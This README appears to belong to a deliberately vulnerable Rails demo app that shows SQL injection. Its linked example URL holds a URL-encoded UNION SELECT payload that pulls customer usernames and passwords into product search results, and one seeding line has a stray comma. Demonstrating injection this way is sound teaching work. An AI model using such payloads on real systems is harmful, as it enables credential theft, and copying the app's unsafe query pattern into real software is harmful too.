# README

Just a dumb test project and a super simplistic proof of concept for SQL injection 

```bash
bundle install
rails db:setup
```

Then create some stuff in the db so you can play around with it
```ruby
FactoryBot.create_list :product, 20
FactoryBot.create_list, :customer, 10
```

[http://localhost:3007/products](http://localhost:3007/products)

[Example of unsafe query](http://localhost:3007/products?query=%27%29+UNION+select+customers.id%2C++customers.first_name+AS+name%2C+customers.username+AS+cost%2C+customers.password+AS+description%2C+customers.created_at%2C+customers.updated_at+FROM+customers+--&commit=Search)


**TODO:** Actually do stuff with hotwire too. 
